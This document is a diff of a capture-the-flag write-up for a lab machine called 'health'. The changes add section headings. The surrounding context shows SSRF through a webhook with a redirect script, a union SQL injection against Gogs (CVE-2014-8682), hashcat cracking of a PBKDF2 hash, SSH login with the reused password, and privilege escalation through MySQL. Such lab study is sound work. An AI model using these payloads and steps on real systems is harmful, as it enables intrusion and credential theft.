@@ -48,6 +48,7 @@ Content-Length: 638
 
 {"webhookUrl":"http:\/\/10.10.14.166:9000","monitoredUrl":"http:\/\/10.10.14.166:8000","health":"up","body":"<!DOCTYPE HTML PUBLIC \"-\/\/W3C\/\/DTD HTML 4.01\/\/EN\" \"http:\/\/www.w3.org\/TR\/html4\/strict.dtd\">\n<html>\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text\/html; charset=utf-8\">\n<title>Directory listing for \/<\/title>\n<\/head>\n<body>\n<h1>Directory listing for \/<\/h1>\n<hr>\n<ul>\n<\/ul>\n<hr>\n<\/body>\n<\/html>\n","message":"HTTP\/1.0 200 OK","headers":{"Server":"SimpleHTTP\/0.6 Python\/3.10.0","Date":"Sat, 17 Sep 2022 16:30:39 GMT","Content-type":"text\/html; charset=utf-8","Content-Length":"297"}}
 ```
+## 302 Redirect
 Let's see what happens if we make our server responds 302 on GET to our port 8000
 ```python
 import sys
@@ -83,6 +84,7 @@ Now we know that we're running:
 - 2014 GoGits · Version: 0.5.5.1010 Beta  
 - Go1.3.2
 
+## Installing Gogs and exploring the source
 ```bash
 searchsploit gogs
 ---------------------------------------------------------------------- ---------------------------------
@@ -168,6 +170,7 @@ func EncodePassword(rawPwd string, salt string) string {
 	return hex.EncodeToString(pwd)
 ```
 
+## Hashcat PBKDF2-HMAC-SHA256
 which corresponds to this: 
 ```bash
 hashcat -h|grep -i pbkdf2|head -4
@@ -194,7 +197,7 @@ hashcat -m 10900 sha256:10000:TEVkaUVVMFdvYg==:vDVvLqxBwI6YEdRSX6e8ULfOoq4H2CzCy
 ```
 ok, so we now know what we need to extract with the SQLi and how to crack the password
 
-## CVE-2014-8682
+## Manual Union SQLi - CVE-2014-8682
 according to the vulnerability report this is the vulnerable code  
 ```go
 // SearchUserByName returns given number of users whose name contains
@@ -273,6 +276,7 @@ python3 redirect.py "http://127.0.0.1:3000/api/v1/users/search?q=')/**/union/**/
 
 66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37
 ```
+## Cracking the real hash
 ```bash
 printf "66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37"|xxd -r -p|base64
 
@@ -308,12 +312,13 @@ Candidates.#1....: fullysick -> citadel
 Started: Sat Sep 17 22:31:27 2022
 Stopped: Sat Sep 17 22:32:03 2022
 ```
-
 that password is also valid as an ssh password for susanne  
 ```bash
 susanne@health:~$ wc -c user.txt
 33 user.txt
 ```
+
+## Privesc manipulating the  MySQL db
 ```bash
 grep DB_ /var/www/html/.env
 DB_CONNECTION=mysql
@@ -446,6 +451,3 @@ root@health:~# pwd
 root@health:~# wc -c root.txt
 33 root.txt
 ```
-
-
-
